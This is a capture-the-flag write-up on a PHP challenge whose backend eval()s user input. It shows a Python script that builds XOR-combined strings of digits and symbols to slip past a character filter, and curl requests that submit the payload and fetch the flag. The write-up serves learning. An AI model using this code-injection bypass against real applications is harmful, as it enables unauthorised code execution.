# Love Note writeup:
- 1: let make some test:
     every message we submit result to this :
> I don't understand letters darling.What do you mean ....

i submit this: 5+5  and the result is:  10
i thing directly to eval or SSTI :grin: 

ok let  submit this malicious input: ;

Result:

> Parse error: syntax error, unexpected token ";" in /app/index.php(74) : eval()'d code on line 1
so we know that  the backend use our input with eval function.OB3WWYJIFIYG6TRUOIYDSW2WMNFX2SBPHJVTKNL4JA6WOXTBHFMVMZZXMEYHGXSCFASCKKBWJ4ZFAVTEIE======

- 2 know we need to execute code trough  our input.
       for this, we can use burp repeater to make many test.
       after make some test, i understand that the input is filter.
       i use burp intruder to understand the filter. 
# all char is filter expect digits and symbols
 allowed charset is: 0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
we need to creaft our payload with only allowed chars. But how can we do that :thinking: 
# xored text

# dont forget our purpose is: submit "i love You" message.
we need to creaft  two strings composed only of digits and symbols and the Xor of these two strings will give us our message : " I love You".  i write a simple python script to do that

```python
#from pwn import xor
from string import digits, punctuation

allow_charset = digits + punctuation

def xored_text(text):
    obfuscate1 = ''
    obfuscate2 = ''
    result = ''
    for letter in text:
        found = False
        for  l1 in allow_charset:
            for l2 in allow_charset:
                if ord(l1) ^ ord(l2) == ord(letter):
                    obfuscate1 += l1
                    obfuscate2 += l2
                    found = True
                if found:
                    break
            if found:
                break
        if not found:
            print(f"warning we haven't fund  symbol for {letter}")

    print( f"payload : ('{obfuscate1}'^ '{obfuscate2}')")
    return obfuscate1 + '   ' + obfuscate2





print(xored_text("i love you"))
```

```bash
$ python3 generate_payload.py
payload : ('2@0068@905'^ '[`\_@]`@_@')
2@0068@905   [`\_@]`@_@

```  the script give us this payload: ('2@0068@905'^ '[`\_@]`@_@')


```bash
curl -X POST  -d expression="('2@0068@905'^ '[\`\_@]\`@_@')"  https://lovenote.up.railway.app/
```
# Result:
in  the result , we have this:
```html
<div class="love-note">
            <h2>Messages approuvés :</h2>
            Check ayiwannoumi1247.txt
        </div>
```
so we need to check  ayiwannoumi1247.txt file
```bash
curl   https://lovenote.up.railway.app/ayiwannoumi1247.txt
LoveCTF{4lw4y5_c0mmun1c473_s3cr37ly_w17h_my_l0v3}
```
winnnnnnnnnnnnnnnnn :sweat_smile: !!!!!!!!!!!
that's all :pray_tone1:
